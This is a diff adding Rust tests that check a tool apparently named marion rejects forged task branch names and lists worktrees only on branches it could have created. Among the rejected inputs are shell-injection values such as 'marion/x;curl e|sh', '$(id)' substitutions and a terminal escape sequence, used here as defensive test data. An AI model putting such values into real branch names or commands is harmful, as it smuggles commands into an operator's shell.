@@ -1536,15 +1536,45 @@ fn cleanup_deletes_an_unchanged_task_branch_and_keeps_an_advanced_one() {
         task_branch_ref("marion/0197f3aa-1c2d"),
         Some("refs/heads/marion/0197f3aa-1c2d".into())
     );
+    assert_eq!(
+        task_branch_ref("marion/433f-add-a-top-n"),
+        Some("refs/heads/marion/433f-add-a-top-n".into())
+    );
     for branch in [
         "main",
         "marion/",
         "marion/a/b",
         "marion/..",
         "refs/heads/main",
+        "marion/x;curl e|sh",
+        "marion/$(id)",
+        "marion/a b",
+        "marion/-x",
+        "marion/.hidden",
+        "marion/a\x1b[2K",
     ] {
         assert_eq!(task_branch_ref(branch), None, "{branch:?}");
     }
+}
+
+/// **A worktree is listed on its checked-out branch only where marion could have cut it**: a node
+/// may check out any name in its own worktree, and the one it picks reaches the operator's merge
+/// command, so any other is listed on its task's own branch.
+#[test]
+fn a_worktree_is_listed_on_its_branch_only_where_marion_could_have_cut_it() {
+    let task = TaskId("t-1".into());
+    assert_eq!(
+        listed_branch(Some("marion/433f-add".into()), &task),
+        "marion/433f-add"
+    );
+    for forged in ["main", "marion/x;curl e|sh", "marion/a/b", "evil$(id)"] {
+        assert_eq!(
+            listed_branch(Some(forged.into()), &task),
+            "marion/t-1",
+            "{forged}"
+        );
+    }
+    assert_eq!(listed_branch(None, &task), "marion/t-1");
 }
 
 /// **A spawn refused after its worktree exists takes the worktree back.** The worktree is the
